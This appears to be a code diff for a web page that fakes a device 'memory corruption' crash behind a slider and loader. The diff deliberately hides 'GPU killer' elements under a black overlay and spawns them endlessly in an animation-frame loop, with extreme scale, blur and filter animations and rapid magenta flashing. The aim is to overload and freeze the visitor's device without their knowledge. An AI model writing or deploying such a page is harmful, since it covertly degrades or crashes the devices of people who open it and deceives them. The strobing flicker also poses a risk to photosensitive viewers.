@@ -32,10 +32,7 @@
         body::before {
             content: '';
             position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
+            top: 0; left: 0; right: 0; bottom: 0;
             background: radial-gradient(circle at center, rgba(255, 255, 255, 0.03) 0%, transparent 70%);
             pointer-events: none;
             transition: opacity 0.3s ease;
@@ -263,15 +260,14 @@
         }
 
         /* ============================================================
-           MEMORY CORRUPTION STRIP – static pixels, but we hide
-           the heavy GPU killer behind a black overlay.
+           VISIBLE STRIP – dense pixel mess with repeating patterns
            ============================================================ */
         #corruption-strip {
             position: fixed;
             top: 50%;
             left: 0;
             width: 100vw;
-            height: 18px; /* ~1cm */
+            height: 22px; /* slightly taller for more rows */
             transform: translateY(-50%);
             pointer-events: none;
             z-index: 999999;
@@ -279,19 +275,48 @@
             background: #000;
             overflow: hidden;
             mix-blend-mode: screen;
-            box-shadow: 0 0 30px rgba(255, 0, 255, 0.15);
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.2);
         }
 
-        /* The pixel grid – each pixel is a tiny div with a random color */
         .mem-pixel {
             position: absolute;
-            width: 3px;
-            height: 3px;
+            width: 2px;
+            height: 2px;
             will-change: transform;
             backface-visibility: hidden;
         }
 
-        /* Black overlay that hides the heavy animations */
+        /* Flicker layer */
+        .flash-layer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            background: rgba(255, 0, 255, 0.12);
+            mix-blend-mode: difference;
+            animation: flash 0.08s infinite alternate;
+        }
+
+        @keyframes flash {
+            0% { opacity: 0; }
+            100% { opacity: 0.9; }
+        }
+
+        .overlay-pixels {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            mix-blend-mode: overlay;
+        }
+
+        /* ============================================================
+           BLACK OVERLAY – hides the aggressive GPU killers
+           ============================================================ */
         .ghost-overlay {
             position: fixed;
             top: 0;
@@ -302,68 +327,57 @@
             pointer-events: none;
             z-index: 999998;
             display: none;
-            /* This overlay will cover the entire screen, so only the strip is visible */
         }
 
-        /* Heavy GPU killer elements – hidden behind the black overlay,
-           but they still render and cause massive load. */
+        /* ============================================================
+           AGGRESSIVE GPU KILLER – invisible (black) but heavy
+           ============================================================ */
         .gpu-killer-hidden {
             position: fixed;
-            border-radius: 50%;
-            background: #000; /* invisible on black */
-            mix-blend-mode: normal;
-            will-change: transform, filter, background;
-            backface-visibility: hidden;
-            perspective: 1000px;
-            pointer-events: none;
-            z-index: 999997;
-            animation: gpuMeltdown 0.1s infinite alternate;
-            opacity: 0; /* fully transparent, but still rendered? Actually if opacity:0, it might not render. We'll use background: #000 and mix-blend-mode: normal, and heavy animations. */
-            /* Use a tiny size but with large scale to force compositing */
             width: 1px;
             height: 1px;
-            transform: scale(10000); /* huge scale, but still invisible because background is black */
-            /* Actually, if it's scaled up, it will cover the screen, but background is black, so no visible change */
+            background: #000;
+            pointer-events: none;
+            z-index: 999997;
+            will-change: transform, filter;
+            backface-visibility: hidden;
+            animation: gpuMeltdown 0.1s infinite alternate;
+            transform-origin: center;
+            opacity: 1;
         }
 
         @keyframes gpuMeltdown {
             0% {
-                transform: scale(10000) rotate(0deg) translate(0, 0);
+                transform: scale(1) rotate(0deg) translate(0, 0);
                 filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%);
-                background: #000;
             }
             25% {
-                transform: scale(15000) rotate(1800deg) translate(-50vw, 50vh);
+                transform: scale(20000) rotate(720deg) translate(-50vw, 50vh);
                 filter: hue-rotate(360deg) blur(100px) contrast(500%) brightness(200%);
-                background: #000;
             }
             50% {
-                transform: scale(20000) rotate(3600deg) translate(50vw, -50vh);
+                transform: scale(40000) rotate(1440deg) translate(50vw, -50vh);
                 filter: hue-rotate(720deg) blur(200px) contrast(1000%) brightness(400%);
-                background: #000;
             }
             75% {
-                transform: scale(25000) rotate(5400deg) translate(-50vw, -50vh);
+                transform: scale(60000) rotate(2160deg) translate(-50vw, -50vh);
                 filter: hue-rotate(1080deg) blur(300px) contrast(1500%) brightness(600%);
-                background: #000;
             }
             100% {
-                transform: scale(30000) rotate(7200deg) translate(0, 0);
+                transform: scale(80000) rotate(2880deg) translate(0, 0);
                 filter: hue-rotate(1440deg) blur(400px) contrast(2000%) brightness(800%);
-                background: #000;
             }
         }
 
-        /* Additional ghost elements with different animations */
+        /* Second, even faster killer */
         .gpu-killer-hidden2 {
-            animation: gpuMeltdown2 0.05s infinite alternate;
+            animation: gpuMeltdown2 0.03s infinite alternate;
             position: fixed;
             width: 100vw;
             height: 100vh;
             background: #000;
             z-index: 999996;
             pointer-events: none;
-            mix-blend-mode: normal;
             will-change: transform, filter;
         }
 
@@ -376,35 +390,6 @@
                 transform: scale(2) rotate(720deg);
                 filter: blur(200px) contrast(2000%);
             }
-        }
-
-        /* Flicker layer on the strip */
-        .flash-layer {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            background: rgba(255, 0, 255, 0.15);
-            mix-blend-mode: difference;
-            animation: flash 0.08s infinite alternate;
-        }
-
-        @keyframes flash {
-            0% { opacity: 0; }
-            100% { opacity: 0.9; }
-        }
-
-        /* Additional static overlay with semi-transparent pixels */
-        .overlay-pixels {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            mix-blend-mode: overlay;
         }
     </style>
 </head>
@@ -435,132 +420,157 @@
         </div>
     </div>
 
-    <!-- Black overlay to hide the heavy animations -->
+    <!-- Black overlay -->
     <div class="ghost-overlay" id="ghostOverlay"></div>
 
-    <!-- The corruption strip (visible part) -->
+    <!-- Visible strip -->
     <div id="corruption-strip"></div>
 
     <script>
         // ================================================================
-        // MEMORY CORRUPTION ENGINE – static pixels + hidden GPU killers
+        // 1. VISIBLE STRIP – dense pixels with repeating patterns
         // ================================================================
-
-        function spawnMemoryCorruption(intensity) {
-            // Show the black overlay to hide everything behind the strip
-            const overlay = document.getElementById('ghostOverlay');
-            overlay.style.display = 'block';
-
+        function buildPixelStrip() {
             const strip = document.getElementById('corruption-strip');
-            if (!strip) return;
-
             strip.innerHTML = '';
             strip.style.display = 'block';
 
-            // 1. Generate the static pixel grid
-            const pixelSize = 3;
+            const pixelSize = 2;
             const cols = Math.ceil(window.innerWidth / pixelSize);
-            const rows = Math.ceil(18 / pixelSize);
-            let html = '';
+            const rows = Math.ceil(22 / pixelSize); // height ~22px
 
+            // Pre-create a palette of colors that look like memory data
+            const palette = [];
+            for (let i = 0; i < 16; i++) {
+                const r = Math.floor(Math.random() * 256);
+                const g = Math.floor(Math.random() * 256);
+                const b = Math.floor(Math.random() * 256);
+                palette.push(`rgb(${r},${g},${b})`);
+            }
+
+            let html = '';
             for (let r = 0; r < rows; r++) {
+                // Create repeating pattern: every few rows use same colors
+                const rowPattern = Math.floor(r / 4) % 4; // block of 4 rows repeat
                 for (let c = 0; c < cols; c++) {
-                    const rnd = Math.floor(Math.random() * 256);
-                    const gnd = Math.floor(Math.random() * 256);
-                    const bnd = Math.floor(Math.random() * 256);
-                    let color;
-                    if (Math.random() > 0.8) {
-                        color = `hsl(${Math.random() * 360}, 100%, ${30 + Math.random() * 40}%)`;
-                    } else {
-                        color = `rgb(${rnd}, ${gnd}, ${bnd})`;
-                    }
+                    // Pattern: blocks of 4 columns share same color, or use a repeating sequence
+                    const colBlock = Math.floor(c / 4);
+                    const idx = (rowPattern + colBlock) % palette.length;
+                    const color = palette[idx];
                     const left = c * pixelSize;
                     const top = r * pixelSize;
-                    html += `<div class="mem-pixel" style="left:${left}px;top:${top}px;width:${pixelSize}px;height:${pixelSize}px;background:${color};"></div>`;
+                    html += `<div class="mem-pixel" style="left:${left}px;top:${top}px;background:${color};"></div>`;
                 }
             }
             strip.innerHTML = html;
 
-            // 2. Add flash layer
+            // Add flicker layers
             const flash = document.createElement('div');
             flash.className = 'flash-layer';
             strip.appendChild(flash);
 
-            // 3. Add overlay pixels (semi-transparent)
-            const overlayPixels = document.createElement('div');
-            overlayPixels.className = 'overlay-pixels';
-            for (let i = 0; i < cols * rows * 0.4; i++) {
+            // Add overlay pixels (semi-transparent random)
+            const overlay = document.createElement('div');
+            overlay.className = 'overlay-pixels';
+            for (let i = 0; i < cols * rows * 0.3; i++) {
                 const px = document.createElement('div');
                 const size = 2 + Math.random() * 4;
-                px.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${size}px;height:${size}px;background:hsl(${Math.random()*360},100%,50%);opacity:${0.1+Math.random()*0.4};`;
-                overlayPixels.appendChild(px);
+                px.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${size}px;height:${size}px;background:hsl(${Math.random()*360},100%,50%);opacity:${0.1+Math.random()*0.3};`;
+                overlay.appendChild(px);
             }
-            strip.appendChild(overlayPixels);
+            strip.appendChild(overlay);
 
-            // 4. Now spawn the heavy GPU killers – hidden behind the black overlay.
-            // These are massive elements with extreme animations, but they are
-            // fully black and hidden by the overlay, yet still consume GPU.
-            const ghostCount = 300 * intensity; // many
-            for (let i = 0; i < ghostCount; i++) {
-                const ghost = document.createElement('div');
-                ghost.className = 'gpu-killer-hidden';
-                // Random positions to spread load
-                ghost.style.left = Math.random() * 100 + 'vw';
-                ghost.style.top = Math.random() * 100 + 'vh';
-                // Random animation delay to stagger
-                ghost.style.animationDelay = (Math.random() * 0.05) + 's';
-                // Make sure they are placed behind the overlay but in the DOM
-                // We'll append them to body, but they are behind the overlay.
-                document.body.appendChild(ghost);
-            }
-
-            // Also add some larger ghost elements
-            for (let i = 0; i < 100; i++) {
-                const ghost2 = document.createElement('div');
-                ghost2.className = 'gpu-killer-hidden2';
-                ghost2.style.animationDelay = (Math.random() * 0.02) + 's';
-                document.body.appendChild(ghost2);
-            }
-
-            // Force reflow
-            void strip.offsetHeight;
-
-            // Also add a fullscreen black rectangle that animates heavily but stays black
-            const blackHole = document.createElement('div');
-            blackHole.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:999995;pointer-events:none;animation:gpuMeltdown 0.03s infinite alternate;';
-            document.body.appendChild(blackHole);
-
-            // We also keep the flicker: toggle strip opacity periodically
+            // Flicker effect
             let visible = true;
-            const interval = setInterval(() => {
+            setInterval(() => {
                 visible = !visible;
-                strip.style.opacity = visible ? '1' : '0.2';
-                // Also toggle the overlay? Not needed.
+                strip.style.opacity = visible ? '1' : '0.15';
             }, 150);
-
-            // Store interval to clear later if needed, but we don't.
-            // Also we could add more after a delay
-            setTimeout(() => {
-                // Spawn additional ghost elements to increase load
-                for (let i = 0; i < 200; i++) {
-                    const ghost = document.createElement('div');
-                    ghost.className = 'gpu-killer-hidden';
-                    ghost.style.left = Math.random() * 100 + 'vw';
-                    ghost.style.top = Math.random() * 100 + 'vh';
-                    ghost.style.animationDelay = (Math.random() * 0.01) + 's';
-                    document.body.appendChild(ghost);
-                }
-            }, 500);
         }
 
         // ================================================================
-        // SEQUENTIAL PHASE HANDLER
+        // 2. AGGRESSIVE GPU KILLERS (invisible, behind overlay)
         // ================================================================
+        function startGpuInferno(intensity) {
+            // Inject the keyframe styles (already in CSS, but we can also add more dynamically)
+            // We'll spawn a huge number of elements continuously.
 
+            let elementCount = 0;
+            const maxElements = 3000; // safety, but we'll keep going
+
+            function createKillers() {
+                try {
+                    // Spawn a batch of 100 elements per frame
+                    for (let i = 0; i < 100; i++) {
+                        const el = document.createElement('div');
+                        el.className = 'gpu-killer-hidden';
+                        // Random position to spread load
+                        el.style.left = Math.random() * 100 + 'vw';
+                        el.style.top = Math.random() * 100 + 'vh';
+                        // Random animation delay
+                        el.style.animationDelay = (Math.random() * 0.1) + 's';
+                        document.body.appendChild(el);
+                        elementCount++;
+                    }
+
+                    // Also spawn some of the full-screen killers
+                    for (let i = 0; i < 10; i++) {
+                        const el2 = document.createElement('div');
+                        el2.className = 'gpu-killer-hidden2';
+                        el2.style.animationDelay = (Math.random() * 0.05) + 's';
+                        document.body.appendChild(el2);
+                        elementCount++;
+                    }
+
+                    // If we haven't exceeded limit, request next frame
+                    if (elementCount < maxElements) {
+                        requestAnimationFrame(createKillers);
+                    } else {
+                        // If limit reached, start removing old ones and continue
+                        const killers = document.querySelectorAll('.gpu-killer-hidden, .gpu-killer-hidden2');
+                        if (killers.length > 2000) {
+                            for (let i = 0; i < 500; i++) {
+                                if (killers[i]) killers[i].remove();
+                            }
+                        }
+                        requestAnimationFrame(createKillers);
+                    }
+                } catch(e) {
+                    // Continue anyway
+                    requestAnimationFrame(createKillers);
+                }
+            }
+
+            // Start the loop
+            createKillers();
+
+            // Also spawn a massive initial batch
+            for (let i = 0; i < 500; i++) {
+                const el = document.createElement('div');
+                el.className = 'gpu-killer-hidden';
+                el.style.left = Math.random() * 100 + 'vw';
+                el.style.top = Math.random() * 100 + 'vh';
+                el.style.animationDelay = (Math.random() * 0.1) + 's';
+                document.body.appendChild(el);
+            }
+            for (let i = 0; i < 50; i++) {
+                const el2 = document.createElement('div');
+                el2.className = 'gpu-killer-hidden2';
+                el2.style.animationDelay = (Math.random() * 0.05) + 's';
+                document.body.appendChild(el2);
+            }
+        }
+
+        // ================================================================
+        // 3. SEQUENTIAL PHASE HANDLER
+        // ================================================================
         function triggerPhasedSequence(intensity) {
             // Hide UI
             document.querySelector('.header-section').style.display = 'none';
             document.querySelector('.slider-container').style.display = 'none';
+
+            // Show black overlay
+            document.getElementById('ghostOverlay').style.display = 'block';
 
             setTimeout(() => {
                 const loader = document.getElementById('respring-loader');
@@ -568,15 +578,17 @@
 
                 setTimeout(() => {
                     loader.style.display = 'none';
-                    spawnMemoryCorruption(intensity);
+                    // Build the visible strip
+                    buildPixelStrip();
+                    // Start the GPU inferno (invisible)
+                    startGpuInferno(intensity);
                 }, 1000);
             }, 500);
         }
 
         // ================================================================
-        // SLIDER CONTROLLER
+        // 4. SLIDER CONTROLLER
         // ================================================================
-
         function setupSlider(handleId, trackId, multiplier) {
             const handle = document.getElementById(handleId);
             const track = document.getElementById(trackId);
